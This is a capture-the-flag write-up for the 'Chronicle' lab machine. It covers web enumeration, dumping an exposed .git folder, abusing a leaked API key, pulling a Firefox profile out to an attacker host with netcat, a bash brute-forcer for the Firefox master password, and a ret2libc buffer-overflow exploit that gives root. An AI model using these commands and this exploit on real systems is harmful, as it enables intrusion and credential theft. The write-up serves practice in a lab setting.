# Chronicle - Medium

* Map ```chronicle.thm``` to target IP and scan using ```nmap``` - ```nmap -T4 -p- -A -Pn -v chronicle.thm```:

  * 22/tcp - ssh - OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  * 80/tcp - http - Apache httpd 2.4.29 ((Ubuntu))
  * 8081/tcp - http - Werkzeug httpd 1.0.1 (Python 3.6.9)

* The webpage on port 80 just says the word 'OLD'; we can do some initial web enumeration:

  ```sh
  gobuster dir -u http://chronicle.thm -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # directory scanning
  ```

* On directory scanning, we get a directory /old - this contains a note and a folder 'templates'. The note says everything has been moved to new directory and webapp has been deployed; this could be an indicator for the page on port 8081

* However, it is better to scan this directory as well, since we do not know if there any more hidden files:

  ```sh
  gobuster dir -u http://chronicle.thm/old -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # this wordlist did not give anything

  gobuster dir -u http://chronicle.thm/old -w /usr/share/wordlists/dirb/common.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # we found .git folder from this
  # learnt that we need to use multiple wordlists for this, since other wordlists did not include '.git'
  ```

* In '/old/.git', we have the Git directory of the project - we can browse this for any clues. We can also use tools such as [GitTools](https://github.com/internetwache/GitTools) to try to rebuild the source code:

  ```sh
  git clone https://github.com/internetwache/GitTools.git

  cd GitTools

  cd Dumper

  ./gitdumper.sh -h

  # create a target directory
  mkdir ~/chronicle

  ./gitdumper.sh http://chronicle.thm/old/.git/ ~/chronicle
  # dumps all content from the /old/.git folder

  cd ~/chronicle/.git

  ls -la

  git log
  # shows all commits
  # there are only 4 commits

  # to see what was done in all commits, we can check it with commit-id
  git show 25fa9929ff34c45e493e172bcb64726dfe3a2780
  
  # we can also compare two different commit-ids
  git log -p 33891017aa63726711585c0a2cd5e39a80cd60e6 25fa9929ff34c45e493e172bcb64726dfe3a2780
  ```

* On comparing the first two commits, we can see that for the changes introduced in 'app.py' code, a key "7454c262d0d5a3a0c0b678d6c0dbc7ef" is included, and 'admin' username is also mentioned.

* On port 8081, we have another webpage for some team; according to ```nmap``` it is based off the Werkzeug library. We can do some basic enumeration here as well:

  ```sh
  gobuster dir -u http://chronicle.thm:8081 -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25

  gobuster dir -u http://chronicle.thm:8081/forgot -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25

  gobuster dir -u http://chronicle.thm:8081/login -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25

  gobuster dir -u http://chronicle.thm:8081/api -w /usr/share/wordlists/dirb/big.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # this does not work as intended, we get this error
  # "the server returns a status code that matches the provided options for non existing urls"
  ```

* The '/old/templates' page on port 80 seems to contain the template code used for the page on 8081

* Some pages of interest on port 8081 are:

  * /login
  * /api
  * /forgot

* The /login page does not have any functionality; the /forgot page is supposed to show us our password if we enter the username, but this also does not work

* From the source code, it seems the /forgot page is calling the 'api()' function, so this could be related to /api

* The JS script '/static/js/forget.js' used in /forgot shows the 'api()' function code:

  ```js
  function api(){
      var xhttp = new XMLHttpRequest();
      var data=document.getElementById("username").value;
      console.log(data);
      xhttp.open("POST", "/api/"+data, true);
      xhttp.setRequestHeader("Content-type", "application/json");
      xhttp.send('{"key":"NULL"}')       //Removed the API Key to stop the forget password functionality 
  }
  ```

* So, the function is taking the username value input in '/forgot' (suppose username is 'joe'), logging it to console, and creating a POST request to the endpoint '/api/joe'; the ```Content-Type``` is also changed to 'application/json', but we do not have the key for this at the moment

* On navigating to /api, we get 'API Action Missing'. We can try different request formats:

  ```sh
  curl -X POST http://chronicle.thm:8081/api -H "Content-Type: application/json"
  # 405 Method not allowed

  curl -X POST http://chronicle.thm:8081/api/username -H "Content-Type: application/json"
  # testing with a random username
  # 400 Bad request

  curl -X POST http://chronicle.thm:8081/api/username -H "Content-Type: application/json" -d '{"key":"NULL"}'
  # Invalid API Key
  ```

* From the commit history that we checked earlier for '/old/.git', we can use the username and key found:

  ```sh
  curl -X POST http://chronicle.thm:8081/api/admin -H "Content-Type: application/json" -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}'
  # invalid username
  ```

* This time, the API key is correct but username is incorrect, so we will have to fuzz for the correct username:

  ```sh
  ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -u "http://chronicle.thm:8081/api/FUZZ" -H "Content-Type: application/json" -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}'
  # identify size to be filtered

  ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -X POST -u "http://chronicle.thm:8081/api/FUZZ" -H "Content-Type: application/json" -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}' -fs 16
  # this gives us a valid username

  curl -X POST http://chronicle.thm:8081/api/tommy -H "Content-Type: application/json" -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}'
  # gives password "DevMakesStuff01"
  ```

* Since the /login page on port 8081 does not work, we can try these creds on SSH:

  ```sh
  ssh tommy@chronicle.thm
  # it works

  cat user.txt
  # user flag

  ls -la /home
  # we have 'carlJ' and 'tommyV'

  sudo -l
  # not allowed

  # we can try enumeration using linpeas

  cd /tmp

  # start server on attacker machine to transfer file
  wget http://10.14.60.75:8000/linpeas.sh

  chmod +x linpeas.sh

  ./linpeas.sh
  # shows that we have a .mozilla directory
  ```

* The other user's directory at /home/carlJ has a '.mozilla' directory - we can try to get any data from this using the [firefox decrypt tool](https://github.com/unode/firefox_decrypt):

  ```sh
  ls -la /home/carlJ

  ls -la /home/carlJ/.mozilla

  ls -la /home/carlJ/.mozilla/firefox
  # we can transfer this file to attacker machine
  # first compress it

  zip -r /home/tommyV/mozilla.zip /home/carlJ/.mozilla/

  # in attacker machine
  nc -nvlp 4444 > mozilla.zip

  # in victim ssh
  which nc

  /bin/nc 10.14.60.75 4444 -w 3 < mozilla.zip

  # in attacker machine
  # decompress the zip file
  unzip -q mozilla.zip

  # run the python script for firefox decrypt
  # we need to direct it to this .mozilla folder
  python ~/Tools/firefox_decrypt.py ~/chronicle/home/carlJ/.mozilla/firefox
  # here, we need a master password
  ```

* While using ```firefox_decrypt.py```, we get the prompt to enter master password for only one profile - "0ryxwn4c.default-release"

* We tried the password for 'tommy' here, but it does not work. We can attempt brute-forcing this using a script (writing Bash script instead of Python for a change of habit):

  ```sh
  #!/bin/bash

  function usage {
          echo "[+] Firefox decrypt bruteforce script"
          echo "[+] Usage: $0 /path/to/wordlist"
  }

  if [ -z "${1}" ]; then
          usage
          exit 1
  elif [ -f "${1}" ]; then
          echo "[+] Starting brute force..."
  else echo "{$1} is not valid!"
          exit 2
  fi

  # to avoid newline issues from wordlist
  while IFS='' read -r password || [ -n "$password" ]; do
          # -e is to ensure newline character is interpreted in echo
          # &>/dev/null redirects all stdout (output of command) to /dev/null
          # if the password input is correct, we print the correct password
          if echo -e "2\n$password" | python /home/sv/Tools/firefox_decrypt.py /home/sv/chronicle/home/carlJ/.mozilla/firefox &>/dev/null; then
                  echo "Master password: $password"
                  exit 0
          fi
  done < "$1"
  echo "Password not found"
  ```

  ```sh
  bash firefox_decrypt_brute.sh /usr/share/wordlists/rockyou.txt
  # we get the password "password1"

  python ~/Tools/firefox_decrypt.py ~/chronicle/home/carlJ/.mozilla/firefox
  # this gives us the password 'Pas$w0RD59247' for username 'dev'
  ```

* Now that we have a password from 'carlJ', we can use that to SSH:

  ```sh
  ssh carlJ@chronicle.thm
  # this works using password found from firefox profile

  ls -la
  # we have an uncommon folder here

  ls -la mailing
  # this includes 'smail', a file owned by root
  # it has the s-bit set
  # this is writable by us

  cd mailing

  file smail
  # 64-bit executable

  ./smail
  ```

* Running the binary 'smail', we can see two options - sending a message and changing our signature

* We can see that there is a limit to the input content; we can try a buffer overflow attack here using [ret2libc](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc); [example](https://blog.kuhi.to/rop-with-one-gadget/):

  * Start by noting down the location of the library that the binary relies on:

    ```sh
    ldd smail
    ```

    ```text
    linux-vdso.so.1 (0x00007ffff7ffa000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff79e2000)
    /lib64/ld-linux-x86-64.so.2 (0x00007ffff7dd3000)
    ```
  
  * Following the given example, we can refer the address for ```libc.so.6``` - ```0x00007ffff79e2000```

  * To call system, we would need its memory location:

    ```sh
    readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
    # -s to search for symbols
    ```

    ```text
    232: 0000000000159cd0    99 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.2.5
    607: 000000000004f550    45 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
    1403: 000000000004f550    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
    ```
  
  * We have the offset of system from libc base - ```0x4f550```

  * Since ```/bin/sh``` is a string, we can use ```strings``` on the dynamic library found earlier with ```ldd```. When passing strings as parameters, we need to pass a pointer to string and not its hex representation due to how C works:

    ```sh
    strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
    # -a scans entire file
    # -t outputs offset in hex

    # this gives us the location '1b3e1a' - ```0x1b3e1a```
    ```
  
  * Before creating the exploit, we would also need ```pop rdi; ret``` address to put the parameter into the RDI register according to the example:

    ```sh
    ROPgadget --binary smail | grep rdi
    # this gives address '0x4007f3'
    ```
  
  * Finally, return address also to be included (without this, the exploit hangs):

    ```sh
    objdump -d smail | grep ret
    # -d for disassemble
    # note the first 'retq' address - 0x400556
    ```
  
  * Based on the above info, we can create our Python exploit script similar to the given examples:

    ```py
    from pwn import *

    p = process('./smail')

    libc_base = 0x00007ffff79e2000
    system = libc_base + 0x4f550
    binsh = libc_base + 0x1b3e1a

    POP_RDI = 0x4007f3

    payload = b'A' * 72
    payload += p64(0x400556)
    # this was not given in example, but found from another writeup
    # without including return address exploit does not work
    payload += p64(POP_RDI)
    payload += p64(binsh)
    payload += p64(system)
    payload += p64(0x0)

    p.clean()
    p.sendline("2")
    p.clean()
    p.sendline(payload)
    p.interactive()
    ```
  
  * We can run the exploit - it takes some time as ```pwntools``` check for latest versions in the beginning - but then we get root shell:

    ```sh
    python3 exploit.py
    ```
